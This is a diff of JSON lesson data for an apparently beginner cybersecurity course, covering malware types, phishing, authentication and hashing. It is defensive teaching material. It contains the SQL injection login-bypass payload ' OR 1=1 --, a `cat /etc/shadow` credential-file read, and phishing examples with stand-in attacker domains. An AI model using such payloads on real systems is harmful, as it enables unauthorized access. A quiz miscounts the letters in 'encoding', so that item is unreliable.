+    "whyAreYouHere": "Malicious software (malware) is any code designed to cause harm, steal data, or hijack computational resources. From self-replicating worms and deceptive trojans to devastating modern ransomware gangs, cybersecurity analysts must recognize the taxonomy of cyber threats. In this room, you will learn the primary categories of malware and understand common human-facing social engineering tactics.",
     "objectives": [
-      "Understand the primary malware categories: Viruses, Worms, Trojans, Spyware, and Ransomware",
-      "Learn how Phishing and Social Engineering manipulate human psychology",
-      "Understand Credential Stuffing, Brute-Force, and Password Spraying attacks",
-      "Learn how Denial of Service (DoS / DDoS) disrupts availability",
-      "Identify the anatomy of a real-world phishing attack"
+      "Understand the broad umbrella term 'Malware' (Malicious Software)",
+      "Differentiate between Viruses (needs host file), Worms (self-propagating over networks), and Trojans (disguised as legitimate)",
+      "Learn how Ransomware encrypts user files and demands cryptocurrency payments",
+      "Understand Spyware, Keyloggers, Adware, and Rootkits",
+      "Recognize Social Engineering and Phishing tactics (Spear Phishing, Whaling, Vishing)"
     ],
     "vocabulary": [
       {
         "term": "Malware",
-        "definition": "Malicious software: any program or code intentionally designed to harm, exploit, or steal data from a computer system."
+        "definition": "Any software intentionally designed to cause damage to a computer, server, client, or computer network."
+      },
+      {
+        "term": "Worm",
+        "definition": "A standalone malware computer program that replicates itself automatically across computer networks without requiring human intervention or a host program."
       },
       {
         "term": "Trojan Horse",
-        "definition": "Malware disguised as legitimate, harmless software (like a game or utility) that secretly executes a malicious payload."
+        "definition": "Malicious code disguised as innocent, useful software (like a cracked game or PDF reader) that tricks users into executing it."
       },
       {
         "term": "Ransomware",
-        "definition": "A type of malware that encrypts a victim's files and demands payment (usually cryptocurrency) in exchange for the decryption key."
+        "definition": "Malware that employs asymmetric/symmetric encryption to hold a victim's personal or enterprise data hostage until a ransom is paid."
       },
       {
         "term": "Phishing",
-        "definition": "A social engineering attack where adversaries pose as trusted institutions to trick victims into revealing sensitive information or clicking malicious links."
-      },
-      {
-        "term": "Credential Stuffing",
-        "definition": "An automated attack where lists of leaked username/password pairs are tested against hundreds of websites hoping for password reuse."
-      },
-      {
-        "term": "DDoS (Distributed Denial of Service)",
-        "definition": "An attack that floods a server or network with traffic from thousands of compromised botnet devices to take it offline."
+        "definition": "A social engineering attack where attackers impersonate trustworthy entities via email or messaging to deceive victims into revealing credentials or installing malware."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <polygon points=\"300,25 150,150 450,150\" fill=\"none\" stroke=\"#0284c7\" stroke-width=\"3\"/>\n  <circle cx=\"300\" cy=\"25\" r=\"16\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"10\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text>\n  <text x=\"300\" y=\"30\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">C</text>\n\n  <circle cx=\"150\" cy=\"150\" r=\"16\" fill=\"#10b981\"/>\n  <text x=\"100\" y=\"172\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text>\n  <text x=\"150\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I</text>\n\n  <circle cx=\"450\" cy=\"150\" r=\"16\" fill=\"#f59e0b\"/>\n  <text x=\"500\" y=\"172\" fill=\"#f59e0b\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text>\n  <text x=\"450\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">A</text>\n\n  <text x=\"300\" y=\"100\" fill=\"#f8fafc\" font-size=\"15\" font-weight=\"bold\" text-anchor=\"middle\">The CIA Triad</text>\n  <text x=\"300\" y=\"120\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Core Pillars of Cybersecurity</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Malware Family Tree",
-        "content": "• **Virus**: Attaches to legitimate executable files and spreads when users run infected files.\n• **Worm**: Self-propagating malware that spreads automatically across networks by exploiting unpatched vulnerabilities without any human interaction!\n• **Trojan**: Masquerades as a useful tool (e.g. *free_photoshop.exe*) but installs a hidden backdoor.\n• **Ransomware**: Silently traverses shared drives, encrypts every document using strong AES/RSA encryption, and leaves a `README_RECOVER_FILES.txt` ransom note."
+        "title": "1. The Primary Types of Malware",
+        "content": "\u2022 **Virus**: Attaches itself to a clean file on disk. When a user runs that file, the virus code runs, infects other files, and spreads.\n\u2022 **Worm**: Self-contained and automated! It scans local networks for vulnerable open ports, exploits them, and copies itself to new machines without ANY user interaction (e.g. WannaCry).\n\u2022 **Trojan Horse**: Deceives the victim. Looks like a legitimate utility, calculator, or game crack, but secretly opens a backdoor for an attacker.\n\u2022 **Ransomware**: Scans your hard drive, generates a strong AES-256 key, encrypts all documents, photos, and databases, and deletes the key unless you pay a ransom in Bitcoin.\n\u2022 **Rootkit**: Modifies the operating system kernel and drivers to hide processes, files, and network connections from Antivirus and Task Manager!"
       },
       {
-        "title": "2. The Human Element: Social Engineering",
-        "content": "Attackers often target the human rather than the firewall because humans can be rushed, intimidated, or deceived:\n• **Phishing**: Mass deceptive emails claiming your account is suspended.\n• **Spear Phishing**: Highly tailored phishing targeting a specific individual using details from their LinkedIn or company role.\n• **Baiting**: Leaving infected USB drives in a company parking lot waiting for curious employees to plug them in."
+        "title": "2. Social Engineering & Phishing",
+        "content": "Over 90% of all successful corporate cyberattacks begin with a human, not a technical bug!\n\n\u2022 **Phishing**: Mass generic emails ('Your account is locked; click here to verify').\n\u2022 **Spear Phishing**: Highly targeted emails tailored specifically to an individual using research gathered from LinkedIn.\n\u2022 **Whaling**: Spear phishing targeting high-level executives (CEOs, CFOs).\n\u2022 **Vishing / Smishing**: Voice calls (phone scams) or SMS text messages."
       }
     ],
     "seeExamples": [
       {
-        "title": "Anatomy of a Suspicious Phishing Email",
-        "codeOrDiagram": "From: IT Support <security@support-endlessus-update.com>   <-- Spoofed lookalike domain!\nTo: employee@endlessus.in\nSubject: URGENT: Your password expires in 15 minutes!       <-- Artificial urgency & fear!\n\nDear User,\nYour email access will be terminated immediately unless you\nverify your identity right now:\n\n>> [ Click Here to Keep Your Account ]                      <-- Link points to malicious IP!\n\nIT Help Desk Team",
-        "explanation": "Key red flags: lookalike domain, artificial urgency, threat of termination, and a link pointing outside the real domain."
+        "title": "Deconstructing a Phishing Email Header",
+        "codeOrDiagram": "From: \"IT Support Helpdesk\" <support@legitimate-company.com.attacker-domain.xyz>\nReply-To: evil-collector@gmail.com\nSubject: URGENT: Password Expiring in 1 Hour - Action Required\nLink Target: http://login-portal-verification.ru/login.php",
+        "explanation": "Notice the spoofed display name, urgency trigger, mismatched reply-to address, and suspicious foreign URL."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Inspect an unknown downloaded script file using the Linux `file` utility to determine what it actually is before running it:",
+      "prompt": "Run `echo \"Malware Taxonomy: Virus, Worm, Trojan, Ransomware, Rootkit\"` in the terminal:",
       "initialCommand": "",
-      "expectedCommand": "file update_utility.bin",
-      "simulatedOutput": "update_utility.bin: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped [Reverse Shell / Backdoor payload]\n[+] Success! The file claimed to be an update, but is an ELF binary backdoor.",
-      "explanation": "The `file` command inspects internal magic bytes instead of trusting the file extension, revealing disguised executables."
+      "expectedCommand": "echo \"Malware Taxonomy: Virus, Worm, Trojan, Ransomware, Rootkit\"",
+      "simulatedOutput": "Malware Taxonomy: Virus, Worm, Trojan, Ransomware, Rootkit\n[+] Taxonomy reviewed: The primary families of malicious software.",
+      "explanation": "Summarizes the 5 primary malware classifications."
     },
     "questions": [
       {
-        "id": "r17-q1",
-        "type": "multiple-choice",
-        "question": "Which type of malware can spread automatically across internal network devices without requiring any user to click a link or run a program?",
-        "options": [
-          "A Worm",
-          "A Phishing email",
-          "A Keylogger",
-          "A Cookie"
+        "id": "q-36-1",
+        "type": "exact",
+        "question": "What category of malware self-replicates and spreads across computer networks automatically without requiring user interaction or a host program?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "worm",
+          "worms"
         ],
-        "correctIndex": 0,
-        "explanation": "Worms are self-replicating and self-propagating across network vulnerabilities without human intervention."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four letters: w-o-r-m.",
+        "explanation": "Worms spread across networks independently without human interaction."
       },
       {
-        "id": "r17-q2",
+        "id": "q-36-2",
         "type": "multiple-choice",
-        "question": "Why do attackers perform 'Credential Stuffing' attacks using public databases of passwords leaked from older company breaches?",
+        "question": "What is the term for a highly targeted phishing attack crafted specifically for high-profile executive leadership (CEOs, CFOs)?",
         "options": [
-          "Because people frequently reuse the exact same password across dozens of different websites",
-          "Because old passwords automatically decrypt new SSL certificates",
-          "Because web servers keep passwords in public DNS records",
-          "Because credential stuffing crashes web browsers"
+          "Smishing",
+          "Whaling",
+          "Vishing",
+          "Pharming"
         ],
-        "correctIndex": 0,
-        "explanation": "Massive password reuse across services makes leaked password lists highly effective against other websites."
+        "correctIndex": 1,
+        "hint": "Hunting the biggest fish: Whales.",
+        "explanation": "Whaling targets senior executives and high-value decision-makers."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Inspect Suspicious Binary",
-        "instruction": "Run `file update_utility.bin` to determine the true MIME and executable type of the file.",
+        "title": "Task 1: Review malware taxonomy",
+        "instruction": "Run `echo \"Malware Taxonomy: Virus, Worm, Trojan, Ransomware, Rootkit\"` in the terminal.",
         "hints": [
-          "Concept: File magic byte inspection.",
-          "Direction: Use the file command.",
-          "Tool: `file`",
-          "Syntax: `file update_utility.bin`",
-          "Explanation: Identifies the binary header."
+          "Type: `echo \"Malware Taxonomy: Virus, Worm, Trojan, Ransomware, Rootkit\"`"
         ]
       }
     ],
-    "explainResult": "The `file` utility examined the first 16 bytes of the file, identified the `\\x7fELF` magic number header, and confirmed it is a compiled Linux ELF binary.",
-    "securityConnection": "Threat modeling is the first phase of any security program. Penetration testers emulate these exact threats (Red Team adversary emulation) so defensive teams (Blue Team) can test whether their endpoint detection and response (EDR) software catches the attack.",
-    "completion": {
-      "learned": [
-        "The malware taxonomy (Viruses, Worms, Trojans, Ransomware, Spyware)",
-        "How social engineering and phishing exploit psychological urgency",
-        "The mechanics of Credential Stuffing and Password Spraying",
-        "How to inspect file headers using the Linux `file` utility"
-      ],
-      "practiced": [
-        "file update_utility.bin",
-        "Dissecting phishing email indicators",
-        "Evaluating threat attack surfaces"
-      ]
-    },
-    "nextRoomId": "room-18"
+    "securityConnection": "Security teams use 'Sandboxes' (isolated virtual environments like Cuckoo Sandbox or Any.Run) to safely execute suspicious malware samples and analyze their behavior: which files they create, which registry keys they alter, and which command-and-control (C2) servers they contact.",
+    "id": "room-36",
+    "nextRoomId": "room-37"
   },
   {
-    "id": "room-18",
-    "stage": 4,
-    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
-    "title": "Cryptography Fundamentals: Encryption, Hashing & Encoding",
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "Authentication vs Authorization & Modern Identity",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 17 (Common Cyber Threats)",
-    "whyAreYouHere": "There is one fundamental concept that trips up almost every single beginner in cybersecurity: the difference between Encoding, Encryption, and Hashing. If you mix these up in a job interview or report, your credibility vanishes. In this room, you will learn the Golden Rule: **Encoding is NOT Encryption, and Encryption is NOT Hashing**. You will master symmetric keys, asymmetric public/private keys, and irreversible cryptographic hashes.",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 36: Malware & Common Attack Types",
+    "whyAreYouHere": "Identity is the new perimeter in modern cloud security. But beginners frequently confuse two core access management concepts: **Authentication** (AuthN) and **Authorization** (AuthZ). Showing your passport at the airport proves *who you are* (Authentication); checking your boarding pass proves *which flight you are allowed to board* (Authorization). In this room, you will master identity controls, Multi-Factor Authentication (MFA), and password hashing.",
     "objectives": [
-      "Master the Golden Rule: Encoding ≠ Encryption ≠ Hashing",
-      "Understand Encoding: reversible formatting for data transmission (Base64, URL encoding) with ZERO secrets",
-      "Understand Hashing: irreversible, fixed-size mathematical fingerprints (SHA-256, bcrypt)",
-      "Understand Symmetric Encryption: one shared secret key for encryption and decryption (AES)",
-      "Understand Asymmetric Encryption: public key encrypts, private key decrypts (RSA, ECC)",
-      "Encode and hash data using command-line utilities"
+      "Clearly distinguish Authentication (AuthN - proving identity) from Authorization (AuthZ - verifying permissions)",
+      "Understand the 3 core Authentication Factors: Something you know, Something you have, Something you are",
+      "Learn Multi-Factor Authentication (MFA / 2FA) and why SMS verification is insecure compared to hardware keys (FIDO2)",
+      "Understand how passwords are securely stored using one-way hashes and unique cryptographic salts",
+      "Explore Role-Based Access Control (RBAC) and Attribute-Based Access Control (ABAC)"
     ],
     "vocabulary": [
       {
-        "term": "Plaintext",
-        "definition": "Unencrypted, human-readable clear text data before being processed by a cryptographic algorithm."
+        "term": "Authentication (AuthN)",
+        "definition": "The process of verifying the identity of a user, device, or system (answering: 'Who are you?')."
       },
       {
-        "term": "Ciphertext",
-        "definition": "The encrypted, unintelligible scrambled output produced by an encryption algorithm."
+        "term": "Authorization (AuthZ)",
+        "definition": "The process of verifying whether an authenticated user has permission to access a specific resource or perform an action (answering: 'What are you allowed to do?')."
       },
+      {
+        "term": "MFA (Multi-Factor Authentication)",
+        "definition": "A security mechanism requiring two or more independent authentication factors to verify identity before granting access."
+      },
+      {
+        "term": "Salt",
+        "definition": "A unique, random string appended to passwords before hashing to ensure identical passwords produce completely different hash values, preventing rainbow table attacks."
+      },
+      {
+        "term": "RBAC (Role-Based Access Control)",
+        "definition": "An access control model where permissions are assigned to specific roles (e.g., Auditor, Editor, Admin) and users are assigned to roles."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <polygon points=\"300,25 150,150 450,150\" fill=\"none\" stroke=\"#0284c7\" stroke-width=\"3\"/>\n  <circle cx=\"300\" cy=\"25\" r=\"16\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"10\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text>\n  <text x=\"300\" y=\"30\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">C</text>\n\n  <circle cx=\"150\" cy=\"150\" r=\"16\" fill=\"#10b981\"/>\n  <text x=\"100\" y=\"172\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text>\n  <text x=\"150\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I</text>\n\n  <circle cx=\"450\" cy=\"150\" r=\"16\" fill=\"#f59e0b\"/>\n  <text x=\"500\" y=\"172\" fill=\"#f59e0b\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text>\n  <text x=\"450\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">A</text>\n\n  <text x=\"300\" y=\"100\" fill=\"#f8fafc\" font-size=\"15\" font-weight=\"bold\" text-anchor=\"middle\">The CIA Triad</text>\n  <text x=\"300\" y=\"120\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Core Pillars of Cybersecurity</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. AuthN vs AuthZ: Identity vs Permissions",
+        "content": "\u2022 **Authentication (AuthN)**: *\"I am cadet, and here is my password and authenticator token.\"* The system validates your credentials against its database.\n\u2022 **Authorization (AuthZ)**: Now that the system knows you are cadet, can you click the red 'Format Production Database' button? The system checks your role: *\"No! Only Administrators have permission to do that (403 Forbidden).\"*\n\n**Common Vulnerability**: A system that authenticates users perfectly, but forgets to check authorization before returning data, is vulnerable to Broken Access Control (OWASP Top 10 #1)!"
+      },
+      {
+        "title": "2. The Three Factors of Authentication",
+        "content": "True MFA requires combining at least two **different categories**:\n\n1. **Something You Know**: Password, PIN, mother's maiden name.\n2. **Something You Have**: Smartphone with authenticator app (TOTP), physical FIDO2 YubiKey, smartcard.\n3. **Something You Are**: Biometrics\u2014fingerprint scan, facial recognition, retina scan.\n\n*Entering your password and then answering a security question is NOT two-factor authentication\u2014both are just things you know!*"
+      },
+      {
+        "title": "3. Storing Passwords: Salted Hashes",
+        "content": "Companies should **NEVER store passwords in plain text**! If an attacker breaches the database, every user's password is stolen.\n\nInstead, secure applications use modern cryptographic password-hashing algorithms (like `bcrypt`, `Argon2id`, or `PBKDF2`):\n\n`Password + Random Salt (16 bytes) ===> Argon2id ===> $argon2id$v=19$m=65536...`\n\nThe salt ensures that even if 500 users all pick `Password123!`, every single hash in the database is completely unique!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Viewing Linux Password Hashes in /etc/shadow",
+        "codeOrDiagram": "root@endlessus:~# cat /etc/shadow | grep \"cadet\"\ncadet:$6$randomsaltstring$abc123456789...:19600:0:99999:7:::\n\n[+] $6$ indicates SHA-512 hashing with a unique random salt string.",
+        "explanation": "Linux stores user passwords as salted hashes in the root-only `/etc/shadow` file."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo \"AuthN: Who are you? | AuthZ: What can you access?\"` in the terminal:",
+      "initialCommand": "",
+      "expectedCommand": "echo \"AuthN: Who are you? | AuthZ: What can you access?\"",
+      "simulatedOutput": "AuthN: Who are you? | AuthZ: What can you access?\n[+] Access control boundary clarified: Authentication vs Authorization.",
+      "explanation": "Contrasts Authentication and Authorization."
+    },
+    "questions": [
+      {
+        "id": "q-37-1",
+        "type": "exact",
+        "question": "What is the security term for the random data added to a password before hashing to defeat precomputed rainbow table attacks?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "salt"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four letters: s-a-l-t.",
+        "explanation": "A cryptographic salt ensures identical passwords produce distinct hashes."
+      },
+      {
+        "id": "q-37-2",
+        "type": "multiple-choice",
+        "question": "Which of the following represents a true Multi-Factor Authentication (MFA) combination?",
+        "options": [
+          "A password and a PIN number",
+          "A password and your mother's maiden name",
+          "A password (something you know) and a physical YubiKey hardware token (something you have)",
+          "A fingerprint scan and a facial recognition scan"
+        ],
+        "correctIndex": 2,
+        "hint": "Requires two distinct factor categories.",
+        "explanation": "Combining something you know (password) with something you have (YubiKey) constitutes true multi-factor authentication."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Contrast AuthN vs AuthZ",
+        "instruction": "Run `echo \"AuthN: Who are you? | AuthZ: What can you access?\"` in the terminal.",
+        "hints": [
+          "Type: `echo \"AuthN: Who are you? | AuthZ: What can you access?\"`"
+        ]
+      }
+    ],
+    "securityConnection": "In **Lab 03 (lab-auth)**, you investigate an authentication endpoint flawed by SQL Injection. Supplying `' OR 1=1 --` tricks the database query into authenticating as administrator without knowing the password, completely bypassing the authentication layer!",
+    "id": "room-37",
+    "nextRoomId": "room-38"
+  },
+  {
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "Encoding vs Hashing vs Encryption",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 37: Authentication vs Authorization & Passwords",
+    "whyAreYouHere": "The single most common mistake made by junior developers and beginners is confusing **Encoding**, **Hashing**, and **Encryption**. Encoding transforms data for safe transmission (it provides ZERO security). Hashing turns data into a fixed-length fingerprint in ONE DIRECTION only (you cannot reverse it). Encryption scrambles data using a SECRET KEY so that ONLY someone with the key can unscramble it. In this room, you will learn to distinguish them effortlessly.",
+    "objectives": [
+      "Clearly distinguish the 3 core data transformation paradigms: Encoding, Hashing, and Encryption",
+      "Understand Encoding (Base64, URL encoding, Hex): reversible by ANYONE without a key",
+      "Understand Cryptographic Hashing (SHA-256, MD5): one-way, irreversible, deterministic, avalanche effect",
+      "Understand Encryption (AES, RSA): two-way, reversible ONLY with the correct secret key",
+      "Encode and decode data from the Linux terminal using `base64` and calculate hashes with `sha256sum`"
+    ],
+    "vocabulary": [
       {
         "term": "Encoding",
-        "definition": "Transforming data into a different format using a public standard (e.g. Base64) for safe transmission. It provides ZERO security!"
+        "definition": "A reversible transformation of data into a different format (like Base64 or Hex) so it can be safely consumed by different systems. Provides zero confidentiality."
       },
       {
         "term": "Hashing",
-        "definition": "A one-way mathematical function that transforms any input into a unique, fixed-length string that CANNOT be reversed."
+        "definition": "A one-way mathematical algorithm that converts an arbitrary-length input into a fixed-length string of characters (digest). Irreversible by design."
       },
       {
-        "term": "Symmetric Encryption",
-        "definition": "Encryption that uses the exact same secret key to both encrypt and decrypt data (e.g. AES-256)."
+        "term": "Encryption",
+        "definition": "The process of scrambling plaintext into ciphertext using a mathematical algorithm and a secret key, reversible only with the decryption key."
       },
       {
-        "term": "Asymmetric Encryption",
-        "definition": "Encryption using a mathematically linked key pair: a Public Key (distributed freely) and a Private Key (kept strictly secret)."
+        "term": "Base64",
+        "definition": "A binary-to-text encoding scheme that represents binary data in an ASCII string format using 64 printable characters (A-Z, a-z, 0-9, +, /)."
+      },
+      {
+        "term": "SHA-256",
+        "definition": "Secure Hash Algorithm generating a 256-bit (64 hexadecimal character) one-way hash digest widely used in SSL certificates and blockchain."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <polygon points=\"300,25 150,150 450,150\" fill=\"none\" stroke=\"#0284c7\" stroke-width=\"3\"/>\n  <circle cx=\"300\" cy=\"25\" r=\"16\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"10\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text>\n  <text x=\"300\" y=\"30\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">C</text>\n\n  <circle cx=\"150\" cy=\"150\" r=\"16\" fill=\"#10b981\"/>\n  <text x=\"100\" y=\"172\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text>\n  <text x=\"150\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I</text>\n\n  <circle cx=\"450\" cy=\"150\" r=\"16\" fill=\"#f59e0b\"/>\n  <text x=\"500\" y=\"172\" fill=\"#f59e0b\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text>\n  <text x=\"450\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">A</text>\n\n  <text x=\"300\" y=\"100\" fill=\"#f8fafc\" font-size=\"15\" font-weight=\"bold\" text-anchor=\"middle\">The CIA Triad</text>\n  <text x=\"300\" y=\"120\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Core Pillars of Cybersecurity</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Golden Rule: The Three Pillars Compared",
-        "content": "• **Encoding (Base64)**:\n  - *Purpose*: Format data so systems don't corrupt it during transit (e.g. sending binary images inside JSON).\n  - *Key*: None! Anyone with a standard decoder can instantly reverse it.\n  - *Security*: **ZERO**. Never use Base64 to 'hide' passwords!\n• **Hashing (SHA-256)**:\n  - *Purpose*: Verify integrity and store passwords safely.\n  - *Key*: None.\n  - *Reversible?*: **NEVER**. You cannot mathematically convert a hash back to its input.\n• **Encryption (AES / RSA)**:\n  - *Purpose*: Maintain confidentiality so only authorized key holders can read data.\n  - *Key*: Required secret cryptographic key.\n  - *Reversible?*: **YES**, but only if you hold the correct secret key!"
+        "title": "1. The Definitive Comparison Table",
+        "content": "| Property | Encoding (e.g. Base64) | Hashing (e.g. SHA-256) | Encryption (e.g. AES-256) |\n|---|---|---|---|\n| **Purpose** | Data compatibility / format transfer | Data integrity & verification | Data confidentiality (privacy) |\n| **Key Required?** | **NO KEY** | **NO KEY** | **YES (Secret Key)** |\n| **Reversible?** | **YES** (Anyone can reverse) | **NO** (Strictly One-Way) | **YES** (Only with key) |\n| **Output Length** | Varies proportionally with input | **Fixed length** (always 64 hex chars for SHA-256) | Varies with input |\n| **Example** | `YWRtaW4=` -> `admin` | `8c6976e5b5410...` (Cannot reverse) | `U2FsdGVkX1...` (Decrypt with key) |"
       },
       {
-        "title": "2. Symmetric vs Asymmetric Encryption",
-        "content": "• **Symmetric (AES)**: Fast and efficient. Both parties share the same secret key.\n  - *Problem*: How do two people on opposite sides of the world exchange the secret key safely without eavesdroppers copying it?\n• **Asymmetric (Public Key Cryptography)**:\n  - You publish your **Public Key** to the whole world. Anyone can use it to encrypt a message for you.\n  - Only your private, guarded **Private Key** can decrypt and read that message!\n  - Modern web security (HTTPS) combines both: it uses Asymmetric encryption to safely exchange a temporary Symmetric AES key!"
+        "title": "2. The Avalanche Effect in Hashing",
+        "content": "A good cryptographic hash function exhibits the **Avalanche Effect**: if you change even a single bit in the input (e.g. changing an uppercase 'A' to lowercase 'a'), over 50% of the output hash digest bits flip randomly!\n\n`sha256(\"Hello World\")` -> `a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e`\n`sha256(\"hello World\")` -> `3b66474917a22cb15cf017c667e6962ac35c5c0d297ca2687c714392fec25b25`\n\nNotice how the output changed completely!"
       }
     ],
     "seeExamples": [
       {
-        "title": "Encoding vs Hashing vs Encryption Example",
-        "codeOrDiagram": "Original String: \"EndlessusPassword123\"\n\n1. Base64 Encoded (Reversible with no key!):\n   → RW5kbGVzc3VzUGFzc3dvcmQxMjM=\n\n2. SHA-256 Hashed (One-way mathematical digest, never reversible!):\n   → 6e580e22f28b788a03222da87b328a6f3b0e3532655bd44b26099dfbe36d1b77\n\n3. AES-256 Encrypted (Reversible ONLY with the secret password key):\n   → U2FsdGVkX1+vGz348xJ3aP0lQ/98d+F2hRk=",
-        "explanation": "Notice the difference: Base64 can be decoded by anyone in 1 millisecond. SHA-256 is permanent. AES requires the secret key."
+        "title": "Encoding and Hashing in the Terminal",
+        "codeOrDiagram": "cadet@endlessus:~$ echo -n \"admin\" | base64\nYWRtaW4=\n\ncadet@endlessus:~$ echo -n \"admin\" | sha256sum\n8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918  -",
+        "explanation": "`base64` encodes reversibly; `sha256sum` produces a deterministic one-way 256-bit digest."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Demonstrate that Base64 encoding is not encryption by decoding a secret token: `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d`:",
+      "prompt": "Run `echo -n \"secret\" | base64` in the terminal to encode the word 'secret' into Base64:",
       "initialCommand": "",
-      "expectedCommand": "echo 'SGFja2VyVmlld1JlYWR5' | base64 -d",
-      "simulatedOutput": "HackerViewReady\n[+] Success! Decoded in 0.001s without any key. Never treat encoding as security!",
-      "explanation": "Base64 is an encoding standard, not encryption. It contains no secret key and provides zero confidentiality."
+      "expectedCommand": "echo -n \"secret\" | base64",
+      "simulatedOutput": "c2VjcmV0\n[+] Base64 encoded: c2VjcmV0 (Reversible with base64 -d).",
+      "explanation": "`base64` encodes ASCII text into 64-character ASCII representation."
     },
     "questions": [
       {
-        "id": "r18-q1",
-        "type": "multiple-choice",
-        "question": "A developer stores user passwords in a database by converting them to Base64 strings. Is this database secure against password theft?",
-        "options": [
-          "Yes, because Base64 uses a 256-bit military key",
-          "No, because Base64 is an encoding scheme that anyone can instantly decode without needing a key or password",
-          "Yes, provided the database is running on Linux",
-          "No, because Base64 strings expire after 24 hours"
+        "id": "q-38-1",
+        "type": "exact",
+        "question": "What 6-letter term describes a reversible data transformation (like Base64) that provides zero secrecy and requires no secret key?",
+        "visualSlots": "_ _ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "encoding",
+          "encode"
         ],
-        "correctIndex": 1,
-        "explanation": "Base64 is merely a data representation format, not encryption. Anyone who accesses the database can reverse all passwords instantly."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Encoding (not encryption).",
+        "explanation": "Encoding formats data for compatibility, not confidentiality."
       },
       {
-        "id": "r18-q2",
+        "id": "q-38-2",
         "type": "multiple-choice",
-        "question": "In Asymmetric Public-Key Cryptography, if Alice wants to send a secret message to Bob, which key should she use to encrypt the message?",
+        "question": "Which of the following statements about cryptographic hashing is true?",
         "options": [
-          "Alice's own Private Key",
-          "Bob's Public Key",
-          "Bob's Private Key",
-          "Alice's Public Key"
+          "A hash can be easily decrypted using a private key",
+          "Hashing is strictly a one-way mathematical function and cannot be reversed to recover original plaintext",
+          "Changing one letter in the input produces nearly the exact same hash output",
+          "Hashing algorithms are only used on Windows operating systems"
         ],
         "correctIndex": 1,
-        "explanation": "Alice encrypts using Bob's freely available Public Key. Once encrypted, only Bob's Private Key can decrypt and read the message."
+        "hint": "Hashing is strictly one-way.",
+        "explanation": "Cryptographic hashes are one-way functions designed to be irreversible."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Decode Base64 Payload",
